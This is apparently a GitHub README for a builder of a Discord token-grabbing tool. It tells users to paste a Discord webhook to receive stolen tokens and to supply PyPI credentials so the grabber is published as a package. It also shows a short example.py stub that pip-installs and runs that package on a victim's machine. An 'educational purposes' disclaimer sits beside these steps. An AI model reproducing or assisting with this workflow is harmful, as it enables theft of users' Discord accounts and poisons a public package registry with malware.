<h1 align="center">discord-token-grabber 👋</h1>
<p>
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-blue.svg?cacheSeconds=2592000" />
  <a href="https://github.com/efenatuyo/discord-token-grabber#README.md#" target="_blank">
    <img alt="Documentation" src="https://img.shields.io/badge/documentation-yes-brightgreen.svg" />
  </a>
  <a href="https://github.com/efenatuyo/discord-token-grabber/graphs/commit-activity" target="_blank">
    <img alt="Maintenance" src="https://img.shields.io/badge/Maintained%3F-yes-green.svg" />
  </a>
</p>

### TOKEN GRABBER ITSELF WAS NOT CREATED BY ME I JUST CREATED THE BUILDER
[token grabber](https://github.com/AstraaDev/Discord-Token-Grabber-V2)
***
### How to install
1. Install [python](https://www.python.org/downloads/)
2. extract the zip into a folder
3. execute start.bat 
***

### How to use in main.py
1. wait untill the file installs every module
2. paste your discord webhook
3. create a account at [pypi](https://pypi.org/)
4. give your account details and wait untill it is done it will then create a file named example.py that is the token grabber
***

### example.py
This is how your token grabber could look like
```py
import os
os.system('pip install blablabla')
from blablabla import *

ran()
```
***
### preview
[preview](https://media.discordapp.net/attachments/1012821452669587547/1024761213692948581/unknown.png)
### Notes
```This tool is coded for educational purposes. Please refrain from using this for any illegal activities. The author of this program will NOT be held responsible for misuse.```
***
## Credits
* [Builder](https://github.com/efenatuyo)

* [Token Grabber](https://github.com/AstraaDev)
***
## 📝 License

Copyright © 2022 [Xolo](https://github.com/efenatuyo).<br />
This project is [Apache](http://www.apache.org/licenses/LICENSE-2.0) licensed.

***

## Errors/Fixes

No module named 'Crypto' or 'Cryptodome'
> open a cmd and type `pip install pycryptodome==3.14.1`

> You probably have python 3.10 which has some new shit so downgrade to [python 3.9](https://www.python.org/downloads/release/python-3913/)

***
